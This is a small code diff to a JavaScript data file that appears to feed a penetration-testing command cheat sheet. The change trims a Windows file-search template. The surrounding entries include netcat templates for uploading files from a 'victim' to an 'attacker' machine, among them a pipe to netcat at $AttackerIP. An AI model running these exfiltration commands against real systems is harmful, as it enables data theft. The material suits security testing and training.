@@ -27,7 +27,7 @@ const commandsData = [
                     { title: "Upload from Victim (Attacker)", description: "Create a listener in Attacker Machine", template: "nc -l -p $port -q 1 > file.zip < /dev/null" },
                     { title: "Upload from Victim (Victim)", description: "Upload data from Victim Machine to Attacker Machine by using netcat.", template: "cat file.zip | netcat $AttackerIP $port" },
                     { title: "Search (Linux)", description: "Find a file in linux", template: "find ~ -name '*.txt'" },
-                    { title: "Search (Windows)", description: "Find a file in linux", template: "dir C:\\ *.txt /s /b" },
+                    { title: "Search (Windows)", description: "Find a file in linux", template: "dir *.txt /s /b" },
                 ]
             },
             {
